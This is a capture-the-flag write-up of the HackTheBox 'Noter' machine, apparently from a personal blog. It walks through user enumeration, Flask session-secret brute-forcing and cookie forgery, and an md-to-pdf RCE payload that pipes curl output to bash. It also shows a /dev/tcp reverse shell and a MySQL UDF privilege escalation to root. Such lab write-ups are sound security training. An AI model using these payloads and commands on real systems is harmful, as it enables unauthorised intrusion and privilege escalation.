# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```zsh
$ sudo openvpn lab_access_file.ovpn
```

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```zsh
$ echo '10.10.11.160    noter' | sudo tee -a /etc/hosts      
10.10.11.160 noter
```

# Reconnaissance

## Port scan

We're always starting with port scanning. At first we use masscan to find open ports quickly, then we use nmap to enumerate versions, services and scripts.

```zsh
$ sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.11.160 --rate=500

```

We have 4 ports here, there are `ftp`, `ssh`, `web` servers and some unknown service. FTP is without anonymous access, `Python` is used on web application.

## Web application

We know that there is a web server on port 5000. Let's add `noter.htb` to our /etc/hosts:

> 10.10.11.160    noter noter.htb

Then, we open the website in our browser.

![Web application](/assets/hackthebox/noter/web_app.png)

We also check for technologies used in application by `whatweb` command or `Wappalyzer` browser extension:

```zsh
$ whatweb noter.htb:5000
http://noter.htb:5000 [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.160], Python[3.8.10], Script[text/javascript], Title[Noter], Werkzeug[2.0.2]
```

We have register and login pages, after registration we'll see an empty dashboard. Also we have an access to /notes page which tells us that we don't have notes. 

![After registration](/assets/hackthebox/noter/web_registered.png)

We create a note, there is probably a `Cross-site scripting` (XSS) vulnerability. But I don't think it is useful for us. Then, we can check what we can do with it in dashboard. We can edit and delete the note. I think there is nothing interesting for us.


# user.txt

## Enumeration

If we look closer at the login page, we can find that when we passing wrong login in, the page returns `invalid credentials`. Also, when we passing correct login there is a `invalid login`. We can enumerate users by this vulnerability.

![Invalid credentials](/assets/hackthebox/noter/user_enum2.png)

![Invalid login](/assets/hackthebox/noter/user_enum1.png)

When we log in, we get a session cookie and we know that there is `werkzeug`, which uses `Flask` for cookies. We can decode that cookie to see what does it provide. I used [this site](https://www.kirsle.net/wizards/flask-session.cgi) here.

![Session cookie](/assets/hackthebox/noter/session_cookie.png)



We can try to change the username in cookies. To do that we have to know that Flask also `signs` cookies with secret. We can brute-force it with `flask-unsign` tool. You can install it with `pip`.

```zsh
$ flask-unsign --wordlist ~/tools/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Yt9Qfw.S3EXih7rCwp2detNid8qx8JO3Xk' --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': 'test'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17536 attempts
b'secret123'
```

We got the secret key! Now we can create a new cookie to access other users.

```zsh
$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidXNlciJ9.Yt9UHg.786sxVinwhrAexXrV0tdz4-W1ro
```

Now we change the cookie in our browser. To do that you have to open storage and modify the session cookie.

![Logged in as admin](/assets/hackthebox/noter/web_admin.png)

Unfortunately, admin has not any interesting notes, so we have to enumerate users. There is no any information about the other user exists, so we have to brute-force it with `hydra`:

```zsh
$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p asdasd noter.htb -s 5000 http-post-form '/login:username=^USER^&password=^PASS^:F=credentials' 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-26 02:57:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://noter.htb:5000/login:username=^USER^&password=^PASS^:F=credentials
[5000][http-post-form] host: noter.htb   login: admin   password: asdasd
[5000][http-post-form] host: noter.htb   login: blue   password: asdasd
```

The other user is `blue`, we create a new cookie and access the account.

## Exploitation

### FTP server

![blue account](/assets/hackthebox/noter/blue_account.png)

Blue is a `VIP` user. There are Import/Export functions only on VIP dashboards. We can see several notes at /notes page, we can find ftp credentials in one of them.

![ftp credentials](/assets/hackthebox/noter/ftp_credentials.png)

We connect via FTP to explore. We can find a password policy and files directory there.

In password policy we can find this note:

> 4. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)

We try to login with `ftp_admin` user. It is successful, we download all files:

```zsh
$ ftp ftp_admin@noter
Connected to noter.
220 (vsFTPd 3.0.3)
331 Please specify the password.

230 Login successful.

226 Directory send OK.
ftp> mget *
```

### Application source code

We unzip the backups and start exploring the application. We find `mysql` credentials there.

![MySQL credentials](/assets/hackthebox/noter/mysql_creds.png)

Let's get back on a site.


We can find an export button on /dashboard.

![Export function](/assets/hackthebox/noter/export_function.png)

We're not interested in existing notes, but we can export from external server, let's check what does it do:

```zsh
$ echo 'abrakadabra' > file.txt
$ python3 -m http.server 80
```

And we get error of `invalid file type`, after some test, I found that `markdown` (.md, .markdown) files are accepted.

In source code of app_backup_1638395546.zip we can see that `md-to-pdf.js` version is 4.1.0 and after some google we can find that it is vulnerable to [CVE-2021-23639](https://nvd.nist.gov/vuln/detail/CVE-2021-23639).

![md-to-pdf version](/assets/hackthebox/noter/md_to_pdf_version.png)

### Exploit

We know that .md files are accepted by the application. Let's prepare our payload to exploit that.

test.md:

```md
---js\n((require("child_process")).execSync("curl http://<IP>:<PORT>/reverse.sh | bash"))\n---RCE
```

reverse.sh:

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Also, on our attacking machine we set up a listener:

```zsh
nc -lnvp <PORT>
```

When we're ready, we use `Export directly from cloud` feature with the link to our web server with test.md file. After a few seconds, we will get a reverse shell!

```zsh
$ listener
[*] Starting listener on port 7101
[*] https://www.revshells.com/
listening on [any] 7101 ...

bash: no job control in this shell
svc@noter:~/app/web$ cd ~
svc@noter:~$ cat user.txt
```

# root.txt

# Stabilize shell

Before we start exploring we have to stabilize our shell. We can do that by searching for ssh keys. But if we check there is no ssh keys presents for svc user, so we have to stabilize our reverse shell:

```bash
svc@noter:~/app/web$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
svc@noter:~/app/web$ export TERM=xterm-256color
export TERM=xterm-256color 
svc@noter:~/app/web$ alias ll='ls -lsaht --color=auto'                                                                        
alias ll='ls -lsaht --color=auto'                                                                                             
svc@noter:~/app/web$ ^Z                                                                                                       
zsh: suspended  /home/kali/tools/aliases/listener.sh

```

## Exploring

By performing basic enumeration we can note that we can not see other user processes. I've checked it with `ps` command and [pspy64](https://github.com/DominicBreuker/pspy/blob/master/README.md).

```bash
svc@noter:~$ ps aux

```

It is strange. Also, we've noted that `mysql` is working. After some time I've runned [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to get anything. And there is a misconfiguration in mysql server:

![mysql misconfiguration](/assets/hackthebox/noter/mysql_misconfiguration.png)

MySQL server is runned by `root`, it is a classic misconfiguration on servers. We can perform [Privilege Escalation via library](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library). Let's do it!

## Privilege escalation

In that attack, if the mysql server is running as root (or a different more privileged user) we can make it execute commands. We have to create an [exploit for linux](https://www.exploit-db.com/exploits/1518) and compile it. On victim machine we create our own directory and checking if `gcc` is available:

```bash
svc@noter:~$ mkdir /tmp/flame && cd /tmp/flame
svc@noter:/tmp/flame$ which gcc
/usr/bin/gcc
```

Then, we copy the exploit's source code and compile it:

```bash
wget http://10.10.16.4:8292/raptor_udf2.c
svc@noter:/tmp/flame$ gcc -g -c raptor_udf2.c
svc@noter:/tmp/flame$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Now we have the library, we login inside the Mysql as a privileged user (root) and follow the next steps:

```bash
svc@noter:/tmp/flame$ mysql -u root -p
Enter password:

# Use a database
MariaDB [(none)]> use mysql;

Database changed

# Create a table to load the library and move it to the plugins dir
MariaDB [mysql]> create table npn(line blob);
Query OK, 0 rows affected (0.005 sec)

# Load the binary library inside the table
MariaDB [mysql]> insert into npn values(load_file('/tmp/flame/raptor_udf2.so')); 
Query OK, 1 row affected (0.002 sec)

# Get the plugin_dir path
MariaDB [mysql]> show variables like '%plugin%';

# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ dump in there the library
MariaDB [mysql]> select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';

# Create a function to execute commands
MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
MariaDB [mysql]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+

# Execute commands
MariaDB [mysql]> select do_system("cat /root/root.txt > /tmp/flame/root.txt ; chmod 777 /tmp/flame/root.txt");
MariaDB [mysql]> exit
Bye
svc@noter:/tmp/flame$ cat root.txt
```

It worked! 

# Conclusion

It was a fun box for me. I've stucked when I've got a password policy, checked the user `admin` for it and haven't checked `ftp_admin` for it. That was so close 😂. A privilege escalation was kinda easy to exploit, but really hard to find without any hints or `LinPEAS`, but probably I've just got tired at that moment...

Thank you for reading, I hope it was useful for you ❤️
